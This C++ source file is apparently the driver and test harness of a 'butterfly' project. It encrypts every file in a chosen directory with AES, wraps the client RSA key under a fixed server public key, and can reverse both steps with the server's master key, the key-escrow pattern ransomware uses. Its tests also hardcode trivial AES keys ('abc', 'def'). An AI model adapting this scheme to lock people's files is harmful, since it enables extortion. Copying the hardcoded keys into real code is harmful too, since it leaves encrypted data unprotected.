
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"
#include "aesKeyDatabase.h"

void test_rsa_enc()
{
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA (new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
    // Init rsaEncryptAESKey with keysize 2048
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey(new butterfly::rsa::RSAEncryptor(2048));

    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    butterfly::writeBinFile("CPrivateRSA.pem", cprivateRSAKeyFile.c_str(), static_cast<long>(cprivateRSAKeyFile.length()));

    // Encrypt the CPrivateRSA.pem
    rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile.substr(0, cprivateRSAKeyFile.size() - 1));
    //rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile);

    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();

    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));

}

void test_rsa_dec()
{
    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor(new butterfly::rsa::RSADecryptor("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptor->readEncMSGFromFile("CPrivateRSA.bin");

    std::cout << "Enc: " << encCPrivateRSA << std::endl;
    std::string decrypted;
    rsaDecryptor->decrypt(rsaDecryptor->getEvpPkey(), encCPrivateRSA, decrypted);
    //std::string decrpyted = rsaDecryptor->getDecryptedMessage();
    butterfly::writeBinFile("CPrivateRSA.pem.dec", decrypted.c_str(), static_cast<long>(decrypted.length()));
    std::cout << "Decrypted: " << decrypted.size() << std::endl;
}

void test_rsa_enc_evp()
{
    // Init rsaEncryptCPrivateRSA with SPUBLIC_PEM
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA (new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
    // Init rsaEncryptAESKey with keysize 2048
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey(new butterfly::rsa::RSAEncryptor(2048));


    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    butterfly::writeBinFile("CPrivateRSA.pem", cprivateRSAKeyFile.c_str(), static_cast<long>(cprivateRSAKeyFile.length()));
    // Encrypt the CPrivateRSA.pem
    rsaEncryptCPrivateRSA->encryptEVP(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();
    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));

    // Encrypt the AESKey
    rsaEncryptAESKey->encryptEVP(rsaEncryptAESKey->getEvpPkey(), "abcdef", butterfly::RSAKEY_TYPE::AESKEY);
    std::string encAESKey = rsaEncryptAESKey->getEncryptedMessage();
    rsaEncryptAESKey->writeEncMSGToFile("AESKey.bin", encAESKey, static_cast<int>(encAESKey.length()));

    // Encrypt the AESIV
    //rsaEncryptAESKey->encryptEVP(rsaEncryptAESKey->getEvpPkey(), "bbbbb", butterfly::RSAKEY_TYPE::AESIV);
    //std::string encAESIV = rsaEncryptAESKey->getEncryptedMessage();
    //rsaEncryptAESKey->writeEncMSGToFile("AESIV.bin", encAESIV, static_cast<int>(encAESIV.length()));
};

void test_rsa_dec_evp()
{

    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor(new butterfly::rsa::RSADecryptor("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptor->readEncMSGFromFile("CPrivateRSA.bin");

    std::cout << "Enc: " << encCPrivateRSA << std::endl;
    //rsaDecryptor->decryptEVP(rsaDecryptor->getEvpPkey(), encCPrivateRSA, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);

    std::string decrypted = rsaDecryptor->getDecryptedMessage();
    butterfly::writeBinFile("CPrivateRSA.pem.dec", decrypted.c_str(), static_cast<long>(decrypted.length()));
    std::cout << "Decrypted: " << decrypted.size() << std::endl;


    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor2(new butterfly::rsa::RSADecryptor(decrypted));
    std::string encAESKey = rsaDecryptor2->readEncMSGFromFile("AESKey.bin");
    //rsaDecryptor2->decryptEVP(rsaDecryptor2->getEvpPkey(), encAESKey, butterfly::RSAKEY_TYPE::AESKEY);
    std::string decryptedAESKey = rsaDecryptor2->getDecryptedMessage();
    std::cout << "Decrypted AESKey: " << decryptedAESKey << std::endl;

    std::string encAESIV = rsaDecryptor2->readEncMSGFromFile("AESIV.bin");
    //rsaDecryptor2->decryptEVP(rsaDecryptor2->getEvpPkey(), encAESIV, butterfly::RSAKEY_TYPE::AESKEY);
    std::string decryptedAESIV= rsaDecryptor2->getDecryptedMessage();
    std::cout << "Decrypted AESIV: " << decryptedAESIV << std::endl;

}

void test_aes()
{

    ////// AES PART ///////
    std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
    /*
    aesEncryptor->generateAESKey();
    std::string aeskey = aesEncryptor->getAESKey();
    std::string aesiv = aesEncryptor->getAESIv();
     */
    std::string t = "abc";
    std::string m = "def";
    std::cout << "t: " << t.length() << " m: " << m.length() << std::endl;
    //butterfly::writeBinFile("AESKey.txt", t.c_str(), static_cast<long>(t.length()));
    //butterfly::writeBinFile("AESIv.txt", m.c_str(), static_cast<long>(m.length()));

    aesEncryptor->setAESKey(t);
    aesEncryptor->setAESIv(m);
    std::string s = "/home/christian/projects/butterfly/bin/data/test.pdf";

    aesEncryptor->encryptFile(s);


    sleep(5);
    std::unique_ptr<butterfly::aes::AESDecryptor> aesDecryptor(new butterfly::aes::AESDecryptor());
    //std::string aeskey2 = butterfly::readBinFile("AESKey.txt");
    //std::string aesiv2 = butterfly::readBinFile("AESIv.txt");
    std::string aeskey2 = "abc";
    std::string aesiv2 = "def";
    aesDecryptor->setAESKey(aeskey2);
    aesDecryptor->setAESIv(aesiv2);
    std::string s2 = "/home/christian/projects/butterfly/bin/data/test.pdf";
    aesDecryptor->decryptFile(s2);

}

int main(int argc, char *argv[])
{
    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments args = argparse->parseArgs(argc, argv);

    LOG_INFO("Running " << PROJECT_NAME << " with version " << args._version);
    std::cout << "Running " << PROJECT_NAME << " with version " << args._version << std::endl;

    //test_aes();
    //exit(1);
    // Start Encryption + Decryption
    if ( !args._dir.empty() )
    {
        std::cout << "ENCRYPT + DECRYPT" << std::endl;
        // start encryption
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption from directory " << args._dir << std::endl;
        encryptor->invokeDir(args._dir, args._protected);

        sleep(2);

        // start decryption
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        decryptor->invokeDir(args._dir, "/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");

    }
    // Start only Encryption
    else if ( !args._encrypt.empty() )
    {

        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption from directory " << args._encrypt << std::endl;
        encryptor->invokeDir(args._encrypt, args._protected);

    }
    // Start only Decryption
    else if ( !args._decrypt.empty() )
    {
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        std::cout << "Start Decryption from directory " << args._decrypt << std::endl;
        decryptor->invokeDir(args._decrypt, args._serverpKey);
    }

    /*
    int i = 0;
    /////// Hybrid Part ////////
    while (i < 1)
    {
        // start encryption
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        std::cout << "Start Encryption from directory " << args._dir << std::endl;
        encryptor->invokeDir(args._dir, args._protected);

        sleep(2);

        // start decryption
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem", butterfly::ENC_CPRIVATERSA_FILENAME);

        decryptor->invokeDir(args._dir);

        i++;
        LOG_INFO("NEW HYBRID ENCRYPTION ROUND " << i);
        sleep(10);

    }
    */
     return 0;
}